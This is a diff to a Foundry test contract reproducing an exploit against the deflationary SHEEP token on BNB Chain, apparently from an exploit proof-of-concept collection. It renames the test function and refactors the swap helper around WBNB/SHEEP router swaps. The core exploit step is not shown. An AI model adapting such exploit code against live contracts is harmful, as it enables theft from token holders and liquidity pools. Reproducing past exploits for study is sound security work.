@@ -29,7 +29,7 @@ contract ContractTest is Test {
         vm.label(address(SHEEP), "SHEEP");
     }
 
-    function testExploit() public {
+    function testDeflationaryExploit() public {
         emit log_named_decimal_uint(
             "Exploiter WBNB balance before attack",
             WBNB.balanceOf(address(this)),
@@ -58,7 +58,11 @@ contract ContractTest is Test {
             WBNB.decimals()
         );
         WBNB.approve(address(Router), WBNB.balanceOf(address(this)));
-        swapTokens(address(WBNB), address(SHEEP));
+        swapTokens(
+            address(WBNB),
+            address(SHEEP),
+            WBNB.balanceOf(address(this))
+        );
         emit log_named_decimal_uint(
             "Exploiter SHEEP balance after swap from WBNB",
             SHEEP.balanceOf(address(this)),
@@ -79,7 +83,11 @@ contract ContractTest is Test {
         );
 
         SHEEP.approve(address(Router), SHEEP.balanceOf(address(this)));
-        swapTokens(address(SHEEP), address(WBNB));
+        swapTokens(
+            address(SHEEP),
+            address(WBNB),
+            SHEEP.balanceOf(address(this))
+        );
         emit log_named_decimal_uint(
             "Amount of WBNB after swap from SHEEP",
             WBNB.balanceOf(address(this)),
@@ -91,12 +99,16 @@ contract ContractTest is Test {
     }
 
     // Helper function for swapping tokens
-    function swapTokens(address token1, address token2) internal {
+    function swapTokens(
+        address from,
+        address to,
+        uint256 amountToSwap
+    ) internal {
         address[] memory path = new address[](2);
-        path[0] = address(token1);
-        path[1] = address(token2);
+        path[0] = address(from);
+        path[1] = address(to);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            IERC20(token1).balanceOf(address(this)),
+            amountToSwap,
             0,
             path,
             address(this),
